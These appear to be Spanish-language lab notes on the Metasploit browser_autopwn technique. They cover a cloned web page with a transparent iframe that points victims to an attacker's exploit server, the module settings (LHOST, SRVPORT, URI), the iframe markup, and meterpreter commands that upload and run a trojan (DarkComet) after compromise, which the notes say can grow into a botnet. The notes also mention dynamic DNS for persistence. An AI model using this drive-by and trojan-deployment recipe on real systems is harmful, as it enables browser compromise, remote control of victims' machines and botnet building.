La Técnica Browser_Autopwn
------------------------------

-> Técnica muy intersante globalmente que combina diferentes aspectos de como colar un exploit con malware

1) Resumen:

   -> 2 Máquinas:
      - Atacante con Win XP con WAMP proporcionando un servicio web. Esta será
      	una página web maliciosa, donde se dispondra de un iframe transparente
	que referencia a una máquina donde se encuentra el módulo browser_autopwn

	El módulo browser_autopwn se encarga de lanzar todos los exploits que tiene
	en función de la versión del navegador.

	El módulo estará en un Metaspoloit en la misma máquina que el WAMP. 

      - Víctima, con WinXP SP3

   -> Una vez explotado y con el control de la máquina, se liberará el malware:

      Darkcomment --> A la larga se puede crear una botnet.

2) Procedimiento:

   -> Servidor WAMP con un módulo de metasploit con el auxiliary/browser_autopwn cargado.
      En la máquina se aloja también en la ruta WAMP/www una página we que simula ser un
      sitio hackeado o adquirido para distribuir el malware.

      La página del sitio puede ser clonada por ejemplo con teleport.

      El módulo browser_autopwn se configura con las siguientes opciones:

      LHOST: IP atacante
      SRVPORT: Puerto atacante. 8080
      URI: Localización de la página. / (en este caso)

      En la página se tiene que introducir un iframe transparente:

      <iframe src="192.168.0.56:8080/" width = 0, height=0, style="hiden" />

      Una vez que la víctima ha sido comprometida accedemos a ella por meterpreter.
      EL módulo migrará el proceso para que, aunque la víctima cierrre el navegador se pueda
      seguir teniendo acceso.

      >> sessions -i 1

      >> upload c:\\troyano.exe c:\\

      >> execute -f c:\\troyano.exe

3) Observaciones:

   -> Normalmente se dispondría de un servicio dyndns para evitar utilizar una IP local dinámica.
